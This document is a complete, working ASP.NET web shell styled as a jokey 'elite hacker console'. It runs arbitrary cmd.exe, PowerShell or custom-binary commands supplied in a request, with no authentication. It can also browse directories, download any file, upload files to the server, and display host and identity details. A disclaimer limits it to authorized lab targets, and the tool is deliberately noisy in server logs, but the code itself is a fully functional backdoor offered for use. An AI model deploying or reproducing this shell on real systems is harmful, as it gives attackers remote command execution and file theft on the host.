<%@ Page Language="C#" %>
<!DOCTYPE html>
<!-- <3 @jakobfriedl @claude @glm vibecoded payload — 3l1t3 cr1ng3 3d1t10n -->
<html>
<head>
    <meta charset="utf-8" />
    <title>n0t_a_v1rus.exe</title>
    <style>
        @font-face { font-family: 'Creepster'; font-style: normal; font-weight: 400; font-display: swap;
                     src: url(https://fonts.gstatic.com/s/creepster/v13/AlZy_zVUqJz4yMrniH4hdQ.ttf) format('truetype'); }
        @font-face { font-family: 'VT323'; font-style: normal; font-weight: 400; font-display: swap;
                     src: url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2hsY.ttf) format('truetype'); }
        * { box-sizing: border-box; }
        html, body { margin: 0; padding: 0; }
        body { background: #000; color: #0f0; font-family: "VT323", "Courier New", Courier, monospace;
               padding: 30px 40px; text-shadow: 0 0 4px rgba(0,255,0,0.75); color-scheme: dark; }
        ::selection { background: #0f0; color: #000; text-shadow: none; }
        a { color: #39ff6e; text-decoration: none; }
        a:hover { color: #fff; text-shadow: 0 0 8px #fff; }
        canvas#mtx { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.65; }
        .scanlines { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: -1; pointer-events: none;
                     background: repeating-linear-gradient(0deg, rgba(0,0,0,0.35) 0, rgba(0,0,0,0.35) 1px,
                                                        transparent 1px, transparent 3px); }
        .banner { background: transparent; border: 0; margin: 0 0 6px 0; color: #0f0; font-size: 13px;
                  font-family: "Courier New", Courier, monospace;
                  line-height: 1.15; text-shadow: 0 0 6px #0f0; overflow-x: auto; }
        .glitch { position: relative; font-family: 'Creepster', cursive; font-size: 40px; font-weight: normal;
                  letter-spacing: 2px; color: #0f0;
                  text-shadow: 0 0 12px #0f0; margin: 0 0 6px 0; }
        .glitch::before, .glitch::after { content: attr(data-text); position: absolute; left: 0; top: 0;
                                          width: 100%; overflow: hidden; pointer-events: none; }
        .glitch::before { color: #f0f; text-shadow: none; animation: g1 2.3s infinite linear alternate-reverse; }
        .glitch::after  { color: #0ff; text-shadow: none; animation: g2 1.7s infinite linear alternate-reverse; }
        @keyframes g1 {
            0%   { clip-path: inset(12% 0 74% 0); transform: translate(-3px, 0); }
            25%  { clip-path: inset(48% 0 38% 0); transform: translate(2px, 1px); }
            50%  { clip-path: inset(70% 0 12% 0); transform: translate(-1px, -1px); }
            75%  { clip-path: inset(25% 0 55% 0); transform: translate(3px, 0); }
            100% { clip-path: inset(58% 0 30% 0); transform: translate(-2px, 1px); }
        }
        @keyframes g2 {
            0%   { clip-path: inset(66% 0 10% 0); transform: translate(3px, 0); }
            25%  { clip-path: inset(10% 0 72% 0); transform: translate(-2px, -1px); }
            50%  { clip-path: inset(38% 0 44% 0); transform: translate(2px, 1px); }
            75%  { clip-path: inset(80% 0 4% 0);  transform: translate(-3px, 0); }
            100% { clip-path: inset(5% 0 82% 0);  transform: translate(1px, -1px); }
        }
        .tagline { font-size: 17px; color: #888; text-shadow: none; margin: 0 0 4px 0; }
        .tagline b { color: #f0f; }
        .boot { font-size: 17px; line-height: 1.6; margin: 0 0 18px 0; }
        .boot .fail { color: #f33; text-shadow: 0 0 6px #f33; }
        .blink { animation: blink 1.1s steps(1) infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        .box { border: 1px solid #0f0; background: rgba(0,15,0,0.88); padding: 16px 18px; margin: 14px 0;
               box-shadow: 0 0 12px rgba(0,255,0,0.15) inset; }
        .box::before { content: "==[ " attr(data-title) " ]=="; display: block; font-weight: bold; color: #0f0;
                       margin-bottom: 10px; letter-spacing: 1px; }
        .result { border: 1px dashed #39ff6e; background: rgba(0,255,0,0.05); padding: 10px; margin: 10px 0; }
        .error { border: 1px dashed #f00; color: #f55; background: rgba(255,0,0,0.05); padding: 10px; margin: 10px 0;
                 text-shadow: 0 0 6px #f00; }
        pre { background: rgba(0,25,0,0.95); color: #39ff6e; padding: 14px; overflow-x: auto; font-size: 17px;
              border: 1px solid #0f0; white-space: pre-wrap; word-break: break-all; margin: 10px 0; }
        .cmd-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; margin-bottom: 8px; }
        .cmd-row input[type=text], .cmd-row select, .cmd-row input[type=file] { flex: 1; min-width: 180px;
              background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; border-radius: 0;
              font-family: "VT323", "Courier New", Courier, monospace; font-size: 18px; text-shadow: 0 0 4px rgba(0,255,0,0.75); }
        .cmd-row select { flex: 0 0 auto; }
        .cmd-row option { background: #000; color: #0f0; }
        .cmd-row input[type=text]:focus, .cmd-row input[type=file]:focus { outline: none; box-shadow: 0 0 8px rgba(0,255,0,0.5); }
        input[type=file]::file-selector-button { background: #0f0; color: #000; border: 0; padding: 6px 12px;
              font-family: inherit; font-weight: bold; cursor: pointer; }
        .button { background: #0f0; color: #000; padding: 8px 20px; font-size: 18px; font-family: inherit;
                  font-weight: bold; cursor: pointer; border: 0; border-radius: 0; margin: 0; text-shadow: none; }
        .button:hover { background: #fff; box-shadow: 0 0 12px #0f0; }
        #custom-binary-row { display: none; margin-bottom: 8px; }
        #custom-binary-row input { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px;
              font-family: "VT323", "Courier New", Courier, monospace; font-size: 18px; box-sizing: border-box; }
        h2, h3 { margin: 8px 0 4px 0; font-size: 18px; color: #39ff6e; letter-spacing: 1px; }
        p { margin: 4px 0; font-size: 17px; }
        ul { margin: 6px 0; padding-left: 10px; font-size: 17px; list-style: none; }
        li { margin: 2px 0; }
        .dim { color: #888; text-shadow: none; }
        .ticker { border: 1px solid #0f0; overflow: hidden; white-space: nowrap; margin-top: 18px; font-size: 17px; }
        .ticker span { display: inline-block; animation: scroll 10s linear infinite; }
        @keyframes scroll { to { transform: translateX(-50%); } }
        .cat-corner { position: fixed; bottom: 12px; right: 12px; width: 110px; border: 1px solid #0f0;
                      background: #000; box-shadow: 0 0 12px rgba(0,255,0,0.4); z-index: 1; }
        .cat-corner img { display: block; width: 100%; }
        .cat-corner span { display: block; text-align: center; font-size: 16px; color: #39ff6e; padding: 1px 0; }
    </style>
</head>
<body>
    <canvas id="mtx"></canvas>
    <div class="scanlines"></div>

    <pre class="banner">  ___|  |   | |  |    _ \  |  /  |   | |  |\ \  /
\___ \  |   | |  |   |   | ' /   |   | |  | \  /
      | ___ |___ __| __ &lt;  . \   ___ |___ __|  \
_____/ _|  _|   _|  _| \_\_|\_\ _|  _|   _| _/\_\</pre>
    <h1 class="glitch" data-text="3L1T3 H4X0R C0NS0L3">3L1T3 H4X0R C0NS0L3</h1>
    <p class="tagline">v6.66 — s1ngl3 f1l3 // z3r0 d3ps? n3v3r h34rd 0f h3r <b>[cr1ng3 l04d3d fr0m g00gl3 + g1phy CDNs]</b></p>
    <div class="boot">
        [0.001] sh4rk k3rn3l v6.66 l04d1ng ... 0K<br />
        [0.002] c0nn3ct1ng t0 m41nfr4m3 ... 0K (1ts u, ur th3 m41nfr4m3)<br />
        [0.003] byp4ss1ng f1r3w4ll ... 0K (th3r3 1s n0 f1r3w4ll)<br />
        [0.004] 3ng4g1ng st34lth m0d3 ... <span class="fail">F41L3D</span> (l0ud by d3s1gn, s33 r34dm3)<br />
        [0.005] 3sc4l4t1ng pr1v1l3g3s ... <span class="fail">TRY H4RD3R</span><br />
        <span class="blink">&gt; ACC3SS GR4NT3D_</span>
    </div>

    <%
        string message     = "";
        string messageType = "";
        string output      = "";

        System.Collections.Specialized.NameValueCollection input =
            (Request.HttpMethod == "POST") ? Request.Form : Request.QueryString;
        // listing dir, resolved once up front — form, listing and upload all use it
        string listDir = input["dir"];
        if (string.IsNullOrEmpty(listDir)) {
            listDir = Server.MapPath(".");
        }
        string action = input["action"] ?? "";

        // download — stream the raw file as an attachment and abort, the page never renders
        if (action == "download")
        {
            string dlPath = input["file"] ?? "";
            try
            {
                if (dlPath.Length == 0 || !System.IO.File.Exists(dlPath)) {
                    throw new System.IO.FileNotFoundException("no such file", dlPath);
                }
                Response.Clear();
                Response.ClearHeaders();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition",
                    "attachment; filename=\"" + System.IO.Path.GetFileName(dlPath).Replace("\"", "_") + "\"");
                Response.AddHeader("Content-Length", new System.IO.FileInfo(dlPath).Length.ToString());
                Response.TransmitFile(dlPath);
                Response.End();
            }
            catch (System.Threading.ThreadAbortException) { throw; }
            catch (Exception ex)
            {
                message     = "Download failed: " + ex.Message;
                messageType = "error";
            }
        }

        // upload — multipart POST, saves the file into listDir, page re-renders with the status
        if (action == "upload")
        {
            try
            {
                if (Request.Files.Count == 0) {
                    throw new Exception("no file part in the request — must be multipart/form-data");
                }
                System.Web.HttpPostedFile up = Request.Files[0];
                if (up.ContentLength == 0) {
                    throw new Exception("empty file");
                }
                string destPath = System.IO.Path.Combine(listDir, System.IO.Path.GetFileName(up.FileName));
                up.SaveAs(destPath);
                message     = "Uploaded " + up.ContentLength + " bytes to " + destPath;
                messageType = "result";
            }
            catch (Exception ex)
            {
                message     = "Upload failed: " + ex.Message;
                messageType = "error";
            }
        }

        if (action == "runUpdate")
        {
            try
            {
                string mode    = input["mode"] ?? "cmd";
                string cmdArgs = input["cmdargs"] ?? "";
                string customBin = input["custombin"] ?? "";

                string binary = "";
                string args   = "";

                if (mode == "cmd") {
                    binary = "cmd.exe";
                    args   = "/c " + cmdArgs;
                } else if (mode == "ps") {
                    binary = "powershell.exe";
                    args   = "-NoP -NonI -C \"" + cmdArgs.Replace("\"", "\\\"") + "\"";
                } else {
                    // custom: binary is whatever they typed, args is the args box
                    binary = customBin;
                    args   = cmdArgs;
                }

                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName               = binary;
                psi.Arguments              = args;
                psi.UseShellExecute        = false;
                psi.CreateNoWindow         = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError  = true;

                System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi);
                output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
                process.WaitForExit();

                message     = "3X1T C0D3: " + process.ExitCode + " &nbsp;|&nbsp; P1D w4s: " + process.Id;
                messageType = "result";
            }
            catch (Exception ex)
            {
                message     = "3RR0R: " + ex.Message;
                messageType = "error";
            }
        }
    %>

    <div class="box" data-title="3X3C C0NS0L3">
        <form method="get" id="execform">
            <input type="hidden" name="action" value="runUpdate" />
            <input type="hidden" name="dir" value="<%= System.Web.HttpUtility.HtmlEncode(listDir) %>" />
            <div class="cmd-row">
                <select name="mode" id="mode-sel" onchange="toggleCustom(this.value)">
                    <option value="cmd">cmd.exe (b0r1ng)</option>
                    <option value="ps">p0w3rsh3ll.exe (sp1cy)</option>
                    <option value="custom">cust0m b1n4ry (l33t)</option>
                </select>
                <input type="text" name="cmdargs" placeholder="t3rm1n4t3 th3 t4rg3t... jk. run whoami" autocomplete="off" spellcheck="false" autofocus />
                <button type="submit" class="button">3X3C</button>
            </div>
            <div id="custom-binary-row">
                <input type="text" name="custombin" placeholder="full p4th t0 b1n4ry e.g. D:\...\s0m3th1ng.exe" autocomplete="off" spellcheck="false" />
            </div>
        </form>

        <% if (!string.IsNullOrEmpty(message)) { %>
            <div class="<%= messageType %>"><strong><%= message %></strong></div>
        <% } %>
        <% if (!string.IsNullOrEmpty(output)) { %>
            <pre id="command_result"><%= System.Web.HttpUtility.HtmlEncode(output) %></pre>
        <% } %>
    </div>

    <div class="box" data-title="T3MP0R4L SYNC">
        <p><strong>S3RV3R T1M3 (L0C4L):</strong> <%= DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") %></p>
        <p><strong>S3RV3R T1M3 (UTC / G0D T1M3):</strong> <%= DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") %></p>
        <p><strong>S3CR3T B4CKD00R K3Y:</strong> <%= new Random().Next(1000, 9999) %> <span class="dim blink">(d0nt t3ll 4ny0n3)</span></p>
    </div>

    <div class="box" data-title="H0ST 1NT3LL">
        <p><strong>H0STN4M3:</strong> <%= Environment.MachineName %></p>
        <p><strong>0S V3RS10N:</strong> <%= Environment.OSVersion %></p>
        <p><strong>4SP.N3T V3RS10N:</strong> <%= Environment.Version %></p>
        <p><strong>CWD:</strong> <%= Environment.CurrentDirectory %></p>
    </div>

    <div class="box" data-title="0P3R4T0R 1D3NT1TY">
        <p><strong>U53R:</strong> <%= Environment.UserName %></p>
        <p><strong>D0M41N:</strong> <%= Environment.UserDomainName %></p>
        <p><strong>FULL 1D3NT1TY:</strong> <%= System.Security.Principal.WindowsIdentity.GetCurrent().Name %></p>
        <p><span class="blink">&gt; 1 4M G0D</span> <span class="dim">(0f th1s 4pp p00l 4t l34st)</span></p>
    </div>

    <div class="box" data-title="F1L3 Z0N3">
        <%
            try
            {
        %>
        <h3>&gt; ls -l4 <%= System.Web.HttpUtility.HtmlEncode(listDir) %></h3>
        <ul>
        <% foreach (string file in System.IO.Directory.GetFiles(listDir)) { %>
            <li><span class="dim">[F1L3]</span> <a href="?action=download&amp;file=<%= System.Uri.EscapeDataString(file) %>" target="_blank"><%= System.Web.HttpUtility.HtmlEncode(System.IO.Path.GetFileName(file)) %></a> <span class="dim">(<%= new System.IO.FileInfo(file).Length %> byt3s)</span></li>
        <% } %>
        </ul>
        <h3>&gt; ls -d</h3>
        <ul>
        <%
            System.IO.DirectoryInfo up = System.IO.Directory.GetParent(listDir);
            if (up != null) { %>
            <li><span class="dim">[D1R]</span> <a href="?dir=<%= System.Uri.EscapeDataString(up.FullName) %>">.. (0n3 l3v3l up)</a></li>
        <%  } %>
        <% foreach (string dir in System.IO.Directory.GetDirectories(listDir)) { %>
            <li><span class="dim">[D1R]</span> <a href="?dir=<%= System.Uri.EscapeDataString(dir) %>"><%= System.Web.HttpUtility.HtmlEncode(System.IO.Path.GetFileName(dir)) %></a></li>
        <% } %>
        </ul>
        <%
            }
            catch (Exception ex)
            {
        %>
        <p class="error"><strong>L1ST1NG F41L3D:</strong> <%= System.Web.HttpUtility.HtmlEncode(ex.Message) %></p>
        <%
            }
        %>

        <h3>&gt; 3xf1ltr4t3 1nt0 <%= System.Web.HttpUtility.HtmlEncode(listDir) %></h3>
        <form method="post" enctype="multipart/form-data" id="uploadform">
            <input type="hidden" name="action" value="upload" />
            <input type="hidden" name="dir" value="<%= System.Web.HttpUtility.HtmlEncode(listDir) %>" />
            <div class="cmd-row">
                <input type="file" name="upfile" required />
                <button type="submit" class="button">UPL04D</button>
            </div>
        </form>
    </div>

    <div class="box" data-title="SM4LL PR1NT">
        <p>&gt; authorized targets only. keep it in the lab, or the F8I c0smplay b3c0m3s r34l.</p>
        <p>&gt; deliberately loud: every GET lands in full text in the IIS logs. gr3p <em>action=</em> and you own yours3lf.</p>
        <p>&gt; 3xt3rn4l l1bs h4rm3d: 2 g00gl3 f0nts + 1 sp1nn1ng c4t. z3r0-d3p pur1ty d1d n0t surv1v3 th3 cr1ng3.</p>
    </div>

    <div class="ticker"><span>&gt;&gt; ACC3SS GR4NT3D &gt;&gt; Y0U 4R3 R00T (n0t r34lly, ch3ck wh04m1) &gt;&gt; 0P3R4T10N: SH4RK P0W3R &gt;&gt; 3L1T3 M0D3 3NG4G3D &gt;&gt; &gt;&gt; ACC3SS GR4NT3D &gt;&gt; Y0U 4R3 R00T (n0t r34lly, ch3ck wh04m1) &gt;&gt; 0P3R4T10N: SH4RK P0W3R &gt;&gt; 3L1T3 M0D3 3NG4G3D &gt;&gt; </span></div>

    <div class="cat-corner">
        <img src="https://media.giphy.com/media/iibCT2Gmanm2Qv5yr6/100.gif" alt="sp1nn1ng c4t" title="01iia 01iia" />
        <span class="blink">01iia 01iia 01iia</span>
    </div>

    <script>
    function toggleCustom(val) {
        document.getElementById('custom-binary-row').style.display = val === 'custom' ? 'block' : 'none';
    }
    document.getElementById('execform').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') { e.preventDefault(); this.submit(); }
    });
    (function() {
        var c = document.getElementById('mtx'), g = c.getContext('2d');
        var chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ$#*',
            font = 14, cols = 0, drops = [];
        function reset() {
            c.width  = window.innerWidth;
            c.height = window.innerHeight;
            cols = Math.floor(c.width / font);
            drops = [];
            for (var i = 0; i < cols; i++) {
                drops[i] = Math.random() * c.height / font;
            }
        }
        reset();
        window.onresize = reset;
        setInterval(function() {
            g.fillStyle = 'rgba(0,0,0,0.09)';
            g.fillRect(0, 0, c.width, c.height);
            g.font = font + 'px monospace';
            for (var i = 0; i < cols; i++) {
                var t = chars.charAt(Math.floor(Math.random() * chars.length));
                g.fillStyle = Math.random() > 0.97 ? '#ffffff' : '#00ff00';
                g.fillText(t, i * font, drops[i] * font);
                if (drops[i] * font > c.height && Math.random() > 0.976) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }, 33);
    })();
    </script>
</body>
</html>
